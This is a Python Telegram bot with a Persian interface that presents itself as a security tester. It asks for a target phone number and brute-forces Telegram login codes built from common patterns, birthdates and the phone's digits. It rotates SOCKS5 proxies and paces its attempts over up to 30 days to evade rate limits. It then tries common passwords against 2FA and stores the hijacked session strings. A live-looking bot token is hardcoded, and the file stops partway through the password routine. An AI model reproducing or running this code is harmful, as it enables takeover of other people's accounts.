import logging
import re
import asyncio
import os
import json
import random
import time
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneCodeExpiredError, 
    FloodWaitError, 
    PhoneNumberInvalidError,
    RPCError
)
import urllib.request
import socks

# ============ تنظیمات ============
TOKEN = "8904776846:AAGRyDG6tDubOSAuKdqN0fIDj36vyJif-dc"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

user_sessions = {}
self_data = {}
login_sessions = {}
active_tasks = {}
attack_status = {}

DATA_FILE = "selfs.json"
ATTACK_DATA_FILE = "attacks.json"

# ============ لیست پروکسی‌ها ============
PROXY_LIST = [
    {"addr": "iro.varfootball2.co.uk", "port": 2053},
    {"addr": "silnet.varfootball.co.uk", "port": 2053},
    {"addr": "noron.talebi.co.uk", "port": 2096},
    {"addr": "new.lambforkebeb.co.uk", "port": 2096},
    {"addr": "new2.lambforkebeb.co.uk", "port": 2096},
    {"addr": "noone.lavazemi1.co.uk", "port": 2083},
    {"addr": "silver.ciaude.co.uk", "port": 2096},
    {"addr": "rain.lavazemi2.co.uk", "port": 2053},
    {"addr": "gallery.talebi.co.uk", "port": 2096},
    {"addr": "craft.malavanann.co.uk", "port": 2083},
    {"addr": "ai.golgoli1.co.uk", "port": 2096},
    {"addr": "star.talebi.co.uk", "port": 2096},
    {"addr": "gold.lavazemi4.co.uk", "port": 2096},
    {"addr": "run.golgoli2.co.uk", "port": 2053},
    {"addr": "irogallery.golgoli1.co.uk", "port": 2096},
    {"addr": "flux.lavazemi5.co.uk", "port": 2096},
    {"addr": "hadaf.golgoli2.co.uk", "port": 2053},
]

random.shuffle(PROXY_LIST)

# ============ توابع ذخیره‌سازی ============
def load_data():
    global self_data
    try:
        with open(DATA_FILE, 'r') as f:
            self_data = json.load(f)
    except:
        self_data = {}

def save_data():
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump(self_data, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving data: {e}")

def load_attack_data():
    global attack_status
    try:
        with open(ATTACK_DATA_FILE, 'r') as f:
            attack_status = json.load(f)
    except:
        attack_status = {}

def save_attack_data():
    try:
        with open(ATTACK_DATA_FILE, 'w') as f:
            json.dump(attack_status, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving attack data: {e}")

load_data()
load_attack_data()

def delete_webhook():
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        with urllib.request.urlopen(url) as response:
            return True
    except:
        return False

def clean_phone(text):
    return re.sub(r'[^0-9]', '', text)

def is_valid_phone(text):
    phone = clean_phone(text)
    return len(phone) >= 8 and len(phone) <= 15

# ============ تولید کدهای هوشمند ============
def generate_smart_codes(phone):
    codes = set()
    
    # کدهای رایج
    common_codes = ["12345", "00000", "11111", "22222", "33333", "44444", 
                    "55555", "66666", "77777", "88888", "99999", "54321",
                    "11223", "12321", "12345", "54321", "11122", "22111"]
    for code in common_codes:
        codes.add(code)
    
    # الگوهای تکراری
    for i in range(10):
        for j in range(10):
            codes.add(f"{i}{j}{i}{j}{i}")
            codes.add(f"{i}{i}{j}{j}{i}")
            codes.add(f"{i}{j}{j}{i}{j}")
    
    # تاریخ تولد (سال 60-99)
    for year in range(60, 100):
        for month in range(1, 13):
            for day in range(1, 29):
                month_str = f"0{month}" if month < 10 else str(month)
                day_str = f"0{day}" if day < 10 else str(day)
                code = f"{year}{month_str}{day_str}"
                if len(code) == 5:
                    codes.add(code)
                    codes.add(code[::-1])
    
    # از شماره تلفن
    if len(phone) >= 5:
        last4 = phone[-4:]
        for i in range(10):
            codes.add(f"{last4}{i}")
            codes.add(f"{i}{last4}")
        
        last5 = phone[-5:]
        if len(last5) == 5:
            codes.add(last5)
            codes.add(last5[::-1])
        
        for i in range(0, len(phone)-4):
            for j in range(i+4, min(i+6, len(phone))):
                part = phone[i:j]
                if len(part) == 5:
                    codes.add(part)
                    codes.add(part[::-1])
    
    # الگوهای افزایشی/کاهشی
    for start in range(0, 6):
        codes.add(f"{start}{start+1}{start+2}{start+3}{start+4}")
        codes.add(f"{start+4}{start+3}{start+2}{start+1}{start}")
    
    # تکرار یک رقم
    for i in range(10):
        codes.add(f"{i}{i}{i}{i}{i}")
        codes.add(f"{i}{i}{i}{i}{i+1 if i<9 else 0}")
    
    return list(codes)

# ============ منوی اصلی ============
async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
    user = update.effective_user
    name = user.first_name if user.first_name else "کاربر"
    user_id = str(user.id)
    self_count = len(self_data.get(user_id, []))
    
    text = f"""
🔐 <b>ربات تست امنیت تلگرام</b>

<b>سلام {name} گرامی</b>

✅ <b>قابلیت‌ها:</b>
• تست امنیت با کدهای هوشمند
• مدیریت هوشمند محدودیت‌ها (روزانه 3-5 تلاش)
• حمله هوشمند و آهسته (تا 30 روز)
• تشخیص کدهای 2FA

<b>تعداد اکانت‌های ثبت شده: {self_count}</b>

⚠️ <b>فقط برای تست امنیت اکانت خودتان!</b>
"""
    
    keyboard = [
        [InlineKeyboardButton("🎯 حمله هوشمند", callback_data="new_session")],
        [InlineKeyboardButton("📱 مدیریت اکانت‌ها", callback_data="get_account")],
        [InlineKeyboardButton("📊 وضعیت حمله‌ها", callback_data="attack_status")]
    ]
    
    if edit and update.callback_query:
        try:
            await update.callback_query.edit_message_text(
                text,
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
            await update.callback_query.answer()
        except:
            pass
    else:
        await update.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )

# ============ نمایش وضعیت حمله‌ها ============
async def show_attack_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = str(query.from_user.id)
    
    if user_id not in attack_status or not attack_status[user_id]:
        text = "❌ هیچ حمله‌ای در حال اجرا نیست!"
        keyboard = [[InlineKeyboardButton("🔙 بازگشت", callback_data="back")]]
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        return
    
    text = "📊 <b>وضعیت حمله‌های فعال:</b>\n\n"
    
    for phone, status in attack_status[user_id].items():
        text += f"""
📱 شماره: <code>{phone}</code>
🔑 کدهای تست: {status.get('total_codes', 0):,}
✅ کدهای تست شده: {status.get('tested', 0):,}
📈 پیشرفت: {status.get('progress', 0):.2f}%
🎯 تلاش امروز: {status.get('today_attempts', 0)}/{status.get('max_per_day', 5)}
📅 آخرین تلاش: {status.get('last_attempt', 'ندارد')}
⏳ وضعیت: {status.get('status', 'در حال اجرا')}
{'✅ پیدا شد!' if status.get('found') else ''}
{'🔑 کد پیدا شده: ' + status.get('found_code', '') if status.get('found') else ''}
{'🔐 پسورد پیدا شده: ' + status.get('found_password', '') if status.get('found_password') else ''}
----------------------------------------
"""
    
    keyboard = [
        [InlineKeyboardButton("🔄 بروزرسانی", callback_data="attack_status")],
        [InlineKeyboardButton("⏹ توقف همه", callback_data="stop_all_attacks")],
        [InlineKeyboardButton("🔙 بازگشت", callback_data="back")]
    ]
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ مدیریت اکانت‌ها ============
async def get_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = str(query.from_user.id)
    selfs = self_data.get(user_id, [])
    
    if not selfs:
        text = "❌ هیچ اکانتی ثبت نشده است! لطفاً ابتدا یک اکانت بسازید."
        keyboard = [
            [InlineKeyboardButton("🎯 حمله هوشمند", callback_data="new_session")],
            [InlineKeyboardButton("🔙 بازگشت", callback_data="back")]
        ]
        try:
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
        except:
            pass
        return
    
    text = "📱 لطفاً اکانت مورد نظر را انتخاب کنید:"
    keyboard = []
    for i, self_account in enumerate(selfs):
        phone = self_account.get('phone', 'نامشخص')
        account_name = self_account.get('account_name', 'بدون نام')
        display_phone = phone[-4:] if len(phone) >= 4 else phone
        keyboard.append([InlineKeyboardButton(f"{i+1}. {account_name} - ***{display_phone}", callback_data=f"select_account_{i}")])
    
    keyboard.append([InlineKeyboardButton("🔙 بازگشت", callback_data="back")])
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ انتخاب اکانت ============
async def select_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = str(query.from_user.id)
    
    # بررسی اینکه callback_data درست است
    if not query.data or not query.data.startswith("select_account_"):
        await query.edit_message_text("❌ خطا در انتخاب اکانت!", parse_mode='HTML')
        return
    
    # استخراج ایندکس با مدیریت خطا
    try:
        parts = query.data.split('_')
        if len(parts) < 3:
            await query.edit_message_text("❌ خطا در انتخاب اکانت!", parse_mode='HTML')
            return
        index = int(parts[2])
    except (IndexError, ValueError) as e:
        logger.error(f"Error parsing index: {e}")
        await query.edit_message_text("❌ خطا در انتخاب اکانت!", parse_mode='HTML')
        return
    
    # دریافت لیست اکانت‌ها
    selfs = self_data.get(user_id, [])
    
    # بررسی وجود اکانت
    if not selfs:
        await query.edit_message_text("❌ هیچ اکانتی ثبت نشده است!", parse_mode='HTML')
        return
    
    if index < 0 or index >= len(selfs):
        await query.edit_message_text("❌ اکانت مورد نظر یافت نشد!", parse_mode='HTML')
        return
    
    self_account = selfs[index]
    phone = self_account.get('phone')
    session_string = self_account.get('session')
    api_id = self_account.get('api_id')
    api_hash = self_account.get('api_hash')
    
    # بررسی کامل بودن اطلاعات
    if not phone:
        await query.edit_message_text("❌ شماره تلفن این اکانت موجود نیست!", parse_mode='HTML')
        return
    
    if not session_string or not api_id or not api_hash:
        await query.edit_message_text("❌ اطلاعات این اکانت کامل نیست! لطفاً دوباره ثبت کنید.", parse_mode='HTML')
        return
    
    login_sessions[user_id] = {
        'index': index,
        'phone': phone,
        'session': session_string,
        'api_id': api_id,
        'api_hash': api_hash,
        'step': 'waiting_code'
    }
    
    # ارسال کد به شماره
    try:
        client = TelegramClient(StringSession(session_string), api_id, api_hash)
        await client.connect()
        if await client.is_user_authorized():
            try:
                await client.send_code_request(phone)
            except Exception as e:
                logger.error(f"Error sending code: {e}")
        await client.disconnect()
    except Exception as e:
        logger.error(f"Error connecting: {e}")
    
    text = f"""
📱 <b>مدیریت اکانت</b>
شماره: <code>{phone}</code>
✅ اکانت انتخاب شد!
📩 کد تایید به شماره شما ارسال شد.
لطفاً کد 5 رقمی را وارد کنید:
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ دریافت کد برای مدیریت اکانت ============
async def handle_get_account_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    code = update.message.text.strip()
    
    if user_id not in login_sessions or login_sessions[user_id].get('step') != 'waiting_code':
        await update.message.reply_text("❌ لطفاً از دکمه مدیریت اکانت استفاده کنید.", parse_mode='HTML')
        return
    
    if not code.isdigit() or len(code) != 5:
        await update.message.reply_text("❌ کد باید 5 رقم باشد!", parse_mode='HTML')
        return
    
    data = login_sessions[user_id]
    phone = data['phone']
    session_string = data['session']
    api_id = data['api_id']
    api_hash = data['api_hash']
    index = data['index']
    
    try:
        client = TelegramClient(StringSession(session_string), api_id, api_hash)
        await client.connect()
        
        if not await client.is_user_authorized():
            await update.message.reply_text("❌ سشن معتبر نیست!", parse_mode='HTML')
            return
        
        try:
            await client.sign_in(phone, code)
            me = await client.get_me()
            account_name = me.first_name if me.first_name else "کاربر"
            await client.disconnect()
            
            selfs = self_data.get(user_id, [])
            if index < len(selfs):
                selfs[index]['account_name'] = account_name
                selfs[index]['active'] = True
                save_data()
            
            text = f"""
✅ <b>اکانت با موفقیت گرفته شد!</b>
📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>
"""
            keyboard = [
                [InlineKeyboardButton("🎯 حمله هوشمند", callback_data="new_session")],
                [InlineKeyboardButton("🏠 بازگشت به منو", callback_data="back")]
            ]
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
            
            if user_id in login_sessions:
                del login_sessions[user_id]
            
        except PhoneCodeInvalidError:
            await update.message.reply_text("❌ کد اشتباه است! دوباره تلاش کنید.", parse_mode='HTML')
            return
            
        except FloodWaitError as e:
            wait_time = e.seconds
            hours = wait_time // 3600
            minutes = (wait_time % 3600) // 60
            await update.message.reply_text(
                f"""
⏳ محدودیت تلگرام! زمان انتظار: {hours} ساعت و {minutes} دقیقه
📱 شماره: {phone}
⚠️ لطفاً بعد از اتمام محدودیت تلاش کنید!
""",
                parse_mode='HTML'
            )
            return
            
        except Exception as e:
            await update.message.reply_text(f"❌ خطا: {str(e)[:200]}", parse_mode='HTML')
            return
            
    except Exception as e:
        await update.message.reply_text(f"❌ خطا: {str(e)[:200]}", parse_mode='HTML')

# ============ شروع حمله هوشمند ============
async def new_session(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    user_id = query.from_user.id
    await clear_user_session(user_id)
    user_sessions[user_id] = {"step": "phone"}
    
    text = """
🎯 <b>حمله هوشمند به اکانت تلگرام</b>

📱 لطفاً شماره تلفن هدف را وارد کنید:

<b>مثال‌ها:</b>
• ایران: <code>989123456789</code>
• هند: <code>919876543210</code>

⚠️ شماره را <b>بدون علامت (+)</b> و فقط با اعداد وارد کنید.

⚙️ <b>تنظیمات حمله هوشمند:</b>
• حداکثر ۵ تلاش در روز (قابل تنظیم)
• تست هوشمند کدهای رایج و الگوها
• تشخیص خودکار محدودیت‌ها
• مدت زمان حمله: تا ۳۰ روز
"""
    
    keyboard = [
        [InlineKeyboardButton("⚙️ تنظیمات پیشرفته", callback_data="attack_settings")],
        [InlineKeyboardButton("🔙 لغو", callback_data="back")]
    ]
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ تنظیمات حمله ============
async def attack_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    text = """
⚙️ <b>تنظیمات حمله هوشمند</b>

لطفاً تعداد تلاش‌های روزانه را وارد کنید:
(عدد بین 1 تا 10)

پیش‌فرض: 5 تلاش در روز

⚠️ <b>توصیه:</b>
• 1-3 تلاش در روز: بسیار ایمن (حداقل ریسک)
• 4-6 تلاش در روز: ایمن (ریسک کم)
• 7-10 تلاش در روز: ریسک متوسط (ممکن است محدودیت بگیرد)

💡 هرچه تلاش کمتر باشد، احتمال محدودیت کمتر است!
"""
    
    context.user_data['setting_attempts'] = True
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    try:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except:
        pass

# ============ دریافت شماره ============
async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "phone":
        await update.message.reply_text("❌ لطفاً از دکمه حمله هوشمند استفاده کنید.", parse_mode='HTML')
        return
    
    phone = clean_phone(text)
    
    if not is_valid_phone(phone):
        await update.message.reply_text(
            "❌ شماره تلفن نامعتبر است!\n\n⚠️ شماره را بدون + و فقط با اعداد وارد کنید.",
            parse_mode='HTML'
        )
        return
    
    user_sessions[user_id]['phone'] = phone
    user_sessions[user_id]['step'] = "api_id"
    
    text = f"""
✅ شماره تلفن ثبت شد: <code>{phone}</code>
🔑 <b>مرحله دوم: API ID</b>
لطفاً API ID خود را از my.telegram.org وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# ============ دریافت API ID ============
async def handle_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_id":
        await update.message.reply_text("❌ لطفاً از دکمه حمله هوشمند استفاده کنید.", parse_mode='HTML')
        return
    
    if not text.isdigit():
        await update.message.reply_text("❌ API ID باید عدد باشد.", parse_mode='HTML')
        return
    
    user_sessions[user_id]['api_id'] = int(text)
    user_sessions[user_id]['step'] = "api_hash"
    
    text = f"""
✅ API ID ثبت شد: <code>{text}</code>
🔐 <b>مرحله سوم: API Hash</b>
لطفاً API Hash خود را از my.telegram.org وارد کنید.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 لغو", callback_data="back")]]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# ============ دریافت API Hash ============
async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_sessions or user_sessions[user_id].get("step") != "api_hash":
        await update.message.reply_text("❌ لطفاً از دکمه حمله هوشمند استفاده کنید.", parse_mode='HTML')
        return
    
    if len(text) < 30:
        await update.message.reply_text("❌ API Hash باید حداقل 30 کاراکتر باشد.", parse_mode='HTML')
        return
    
    user_sessions[user_id]['api_hash'] = text
    
    max_per_day = context.user_data.get('max_attempts', 5)
    if max_per_day < 1 or max_per_day > 10:
        max_per_day = 5
    
    msg = await update.message.reply_text(
        f"""
🎯 <b>شروع حمله هوشمند</b>

📱 شماره: <code>{user_sessions[user_id]['phone']}</code>
🔢 تلاش روزانه: {max_per_day} بار
⏳ مدت زمان: تا 30 روز
🎯 استراتژی: هوشمند + الگوهای رایج

حمله در پس‌زمینه اجرا می‌شود...
شما می‌توانید از منوی "وضعیت حمله‌ها" پیشرفت را ببینید.
""",
        parse_mode='HTML'
    )
    
    try:
        data = user_sessions[user_id]
        phone = data['phone']
        api_id = data['api_id']
        api_hash = data['api_hash']
        
        asyncio.create_task(smart_attack(update, context, user_id, phone, api_id, api_hash, msg, max_per_day))
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await context.bot.edit_message_text(
            f"❌ خطا: {str(e)[:200]}",
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        await clear_user_session(user_id)

# ============ حمله هوشمند ============
async def smart_attack(update, context, user_id, phone, api_id, api_hash, msg, max_per_day=5):
    try:
        user_id_str = str(user_id)
        
        all_codes = generate_smart_codes(phone)
        random.shuffle(all_codes)
        
        if user_id_str not in attack_status:
            attack_status[user_id_str] = {}
        
        attack_status[user_id_str][phone] = {
            'total_codes': len(all_codes),
            'tested': 0,
            'progress': 0,
            'today_attempts': 0,
            'max_per_day': max_per_day,
            'last_attempt': 'شروع نشده',
            'status': 'در حال اجرا',
            'found': False,
            'found_code': None,
            'found_password': None,
            'start_date': datetime.now().strftime("%Y-%m-%d %H:%M"),
            'last_reset': datetime.now().strftime("%Y-%m-%d")
        }
        save_attack_data()
        
        client = None
        total_attempts = 0
        wrong_attempts = 0
        flood_count = 0
        MAX_FLOOD = 3
        start_time = datetime.now()
        last_reset_date = datetime.now().date()
        current_day_attempts = 0
        
        try:
            temp_client = TelegramClient(StringSession(), api_id, api_hash)
            await temp_client.connect()
            await temp_client.send_code_request(phone)
            await temp_client.disconnect()
        except:
            pass
        
        await context.bot.edit_message_text(
            f"""
🎯 <b>حمله هوشمند شروع شد!</b>

📱 شماره: <code>{phone}</code>
🔢 تعداد کل کدها: {len(all_codes):,}
📅 تلاش روزانه: {max_per_day} بار
📊 وضعیت: در حال اجرا...

⏳ منتظر زمان مناسب برای اولین تلاش...
""",
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        
        for code in all_codes:
            if attack_status[user_id_str][phone].get('found', False):
                break
            
            current_date = datetime.now().date()
            if current_date > last_reset_date:
                current_day_attempts = 0
                last_reset_date = current_date
                attack_status[user_id_str][phone]['today_attempts'] = 0
                attack_status[user_id_str][phone]['last_reset'] = current_date.strftime("%Y-%m-%d")
                save_attack_data()
            
            if current_day_attempts >= max_per_day:
                tomorrow = current_date + timedelta(days=1)
                next_day = datetime.combine(tomorrow, datetime.min.time())
                wait_seconds = (next_day - datetime.now()).total_seconds()
                
                wait_hours = int(wait_seconds // 3600)
                wait_minutes = int((wait_seconds % 3600) // 60)
                
                await context.bot.edit_message_text(
                    f"""
⏳ <b>به محدودیت روزانه رسیدیم!</b>

📱 شماره: <code>{phone}</code>
📅 امروز: {current_date.strftime("%Y/%m/%d")}
🎯 تلاش امروز: {current_day_attempts} از {max_per_day}

⏰ زمان تا روز بعد: {wait_hours} ساعت و {wait_minutes} دقیقه
📊 پیشرفت: {(total_attempts / len(all_codes)) * 100:.2f}%

💡 حمله فردا ادامه خواهد یافت...
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                
                await asyncio.sleep(wait_seconds + 60)
                continue
            
            if flood_count >= MAX_FLOOD:
                attack_status[user_id_str][phone]['status'] = 'متوقف - محدودیت زیاد'
                save_attack_data()
                await context.bot.edit_message_text(
                    f"""
⚠️ <b>حمله متوقف شد!</b>

📱 شماره: <code>{phone}</code>
🔴 تعداد محدودیت‌ها: {flood_count}
⏳ لطفاً بعد از مدتی دوباره تلاش کنید.
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                return
            
            if client is None or total_attempts % 5 == 0:
                if client:
                    try:
                        await client.disconnect()
                    except:
                        pass
                    client = None
                    await asyncio.sleep(random.uniform(1, 3))
                
                try:
                    if PROXY_LIST:
                        proxy = random.choice(PROXY_LIST)
                        from telethon import socks
                        client = TelegramClient(
                            StringSession(),
                            api_id,
                            api_hash,
                            proxy=(socks.SOCKS5, proxy['addr'], proxy['port'])
                        )
                    else:
                        client = TelegramClient(StringSession(), api_id, api_hash)
                    
                    await client.connect()
                    
                    if total_attempts % 50 == 0 and total_attempts > 0:
                        try:
                            await client.send_code_request(phone)
                            await asyncio.sleep(2)
                        except FloodWaitError as e:
                            await asyncio.sleep(min(e.seconds, 60))
                            try:
                                await client.send_code_request(phone)
                            except:
                                pass
                        except:
                            pass
                    
                except Exception as e:
                    logger.error(f"Client error: {e}")
                    if client:
                        try:
                            await client.disconnect()
                        except:
                            pass
                        client = None
                    await asyncio.sleep(random.uniform(5, 15))
                    continue
            
            total_attempts += 1
            current_day_attempts += 1
            
            attack_status[user_id_str][phone]['tested'] = total_attempts
            attack_status[user_id_str][phone]['progress'] = (total_attempts / len(all_codes)) * 100
            attack_status[user_id_str][phone]['today_attempts'] = current_day_attempts
            attack_status[user_id_str][phone]['last_attempt'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            save_attack_data()
            
            if total_attempts % 10 == 0:
                elapsed = (datetime.now() - start_time)
                days = elapsed.days
                hours = elapsed.seconds // 3600
                minutes = (elapsed.seconds % 3600) // 60
                progress = (total_attempts / len(all_codes)) * 100
                
                await context.bot.edit_message_text(
                    f"""
🎯 <b>حمله هوشمند در حال اجرا...</b>

📱 شماره: <code>{phone}</code>
🔑 کد فعلی: <code>{code}</code>

📊 <b>آمار:</b>
• تلاش‌ها: {total_attempts:,} از {len(all_codes):,}
• پیشرفت: {progress:.2f}%
• تلاش امروز: {current_day_attempts}/{max_per_day}
• زمان گذشته: {days} روز، {hours} ساعت، {minutes} دقیقه
• کدهای اشتباه: {wrong_attempts:,}
• محدودیت‌ها: {flood_count}

⏳ در حال تلاش...
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
            
            try:
                await client.sign_in(phone, code)
                
                attack_status[user_id_str][phone]['found'] = True
                attack_status[user_id_str][phone]['found_code'] = code
                attack_status[user_id_str][phone]['status'] = 'پیدا شد - در حال تست 2FA'
                save_attack_data()
                
                session_string = client.session.save()
                await client.disconnect()
                
                account_name = "بدون نام"
                try:
                    client2 = TelegramClient(StringSession(session_string), api_id, api_hash)
                    await client2.connect()
                    if await client2.is_user_authorized():
                        me = await client2.get_me()
                        account_name = me.first_name if me.first_name else "کاربر"
                    await client2.disconnect()
                except:
                    pass
                
                if user_id_str not in self_data:
                    self_data[user_id_str] = []
                
                self_data[user_id_str].append({
                    "session": session_string,
                    "phone": phone,
                    "api_id": api_id,
                    "api_hash": api_hash,
                    "account_name": account_name,
                    "active": True,
                    "clock_active": False,
                    "active_time": "تنظیم نشده",
                    "font_type": "1",
                    "created": datetime.now().strftime("%Y/%m/%d %H:%M"),
                    "last_update": datetime.now().strftime("%Y/%m/%d %H:%M")
                })
                save_data()
                
                elapsed = (datetime.now() - start_time)
                days = elapsed.days
                hours = elapsed.seconds // 3600
                minutes = (elapsed.seconds % 3600) // 60
                
                await context.bot.edit_message_text(
                    f"""
✅ <b>حمله موفقیت‌آمیز!</b>

📱 شماره: <code>{phone}</code>
👤 نام اکانت: <b>{account_name}</b>
🔑 کد پیدا شده: <code>{code}</code>

📊 <b>آمار نهایی:</b>
• کل تلاش‌ها: {total_attempts:,}
• زمان: {days} روز، {hours} ساعت، {minutes} دقیقه
• کدهای اشتباه: {wrong_attempts:,}

⚠️ <b>هشدار امنیتی!</b>
اکانت شما در برابر حملات Brute Force آسیب‌پذیر است!

✅ <b>توصیه‌ها:</b>
1. از کدهای تصادفی استفاده کنید
2. حتماً 2FA را فعال کنید
3. هرگز کد تایید را به کسی ندهید
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                
                await clear_user_session(user_id)
                return
                
            except PhoneCodeInvalidError:
                wrong_attempts += 1
                wait_time = random.uniform(30, 120)
                await asyncio.sleep(wait_time)
                continue
                
            except FloodWaitError as e:
                flood_count += 1
                wait_time = e.seconds
                if wait_time > 3600:
                    wait_time = min(wait_time, 7200)
                
                await context.bot.edit_message_text(
                    f"""
⏳ <b>محدودیت تلگرام!</b>

📱 شماره: <code>{phone}</code>
⏰ زمان انتظار: {wait_time // 3600} ساعت و {(wait_time % 3600) // 60} دقیقه
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                
                await asyncio.sleep(wait_time + 60)
                continue
                
            except SessionPasswordNeededError:
                attack_status[user_id_str][phone]['status'] = '2FA پیدا شد'
                save_attack_data()
                
                await context.bot.edit_message_text(
                    f"""
🔐 <b>اکانت دارای 2FA است!</b>

📱 شماره: <code>{phone}</code>
✅ کد پیدا شد: <code>{code}</code>
📊 تلاش‌ها: {total_attempts:,}

🔑 در حال تست پسوردهای رایج...
⏳ این مرحله ممکن است چند ساعت طول بکشد...
""",
                    chat_id=update.effective_chat.id,
                    message_id=msg.message_id,
                    parse_mode='HTML'
                )
                
                password_found = await smart_password_attack(
                    update, context, user_id, client, phone, code, 
                    msg, total_attempts, wrong_attempts
                )
                
                if password_found:
                    return
                else:
                    await context.bot.edit_message_text(
                        f"""
✅ <b>نتیجه حمله</b>

📱 شماره: <code>{phone}</code>
✅ کد پیدا شد: <code>{code}</code>

🟢 <b>وضعیت امنیتی خوب!</b>
اکانت شما 2FA دارد و پسورد آن قوی است!

💡 <b>توصیه:</b>
همیشه 2FA را فعال نگه دارید.
""",
                        chat_id=update.effective_chat.id,
                        message_id=msg.message_id,
                        parse_mode='HTML'
                    )
                    await clear_user_session(user_id)
                    return
                
            except Exception as e:
                logger.error(f"Error: {e}")
                continue
        
        attack_status[user_id_str][phone]['status'] = 'تکمیل شد - پیدا نشد'
        save_attack_data()
        
        elapsed = (datetime.now() - start_time)
        days = elapsed.days
        hours = elapsed.seconds // 3600
        
        await context.bot.edit_message_text(
            f"""
✅ <b>حمله تکمیل شد!</b>

📱 شماره: <code>{phone}</code>

🟢 <b>وضعیت امنیتی عالی!</b>
اکانت شما در برابر حملات Brute Force مقاوم است!

📊 <b>آمار نهایی:</b>
• کل تلاش‌ها: {total_attempts:,}
• زمان: {days} روز، {hours} ساعت
• کدهای اشتباه: {wrong_attempts:,}

💡 <b>توصیه:</b>
به همین شکل امنیت اکانت خود را حفظ کنید!
""",
            chat_id=update.effective_chat.id,
            message_id=msg.message_id,
            parse_mode='HTML'
        )
        
        await clear_user_session(user_id)
        
    except Exception as e:
        logger.error(f"Error in smart_attack: {e}")
        try:
            await context.bot.edit_message_text(
                f"❌ خطا: {str(e)[:200]}",
                chat_id=update.effective_chat.id,
                message_id=msg.message_id,
                parse_mode='HTML'
            )
        except:
            pass
        await clear_user_session(user_id)

# ============ حمله پسورد هوشمند ============
async def smart_password_attack(update, context, user_id, client, phone, code, msg, total_attempts, wrong_attempts):
    try:
        user_id_str = str(user_id)
        
        passwords = [
            "123456", "12345678", "123456789", "1234567890",
            "password", "pass", "admin", "admin123",
            "qwerty", "qwerty123", "abc123", "abcd1234",
            "letmein", "welcome", "hello", "12345",
            "111111", "222222", "333333", "444444",
            "555555", "666666", "777777", "888888",
            "999999", "000000", "123123", "321321",
            phone[-6:] if len(phone) >= 6 else "",
            phone[-4:] if len(phone) >= 4 else "",
        ]
        passwords = list(set([p for p in passwords if p and len(p) >= 4]))
        
        attempt = 0
        for password in passwords:
            attempt += 1
            
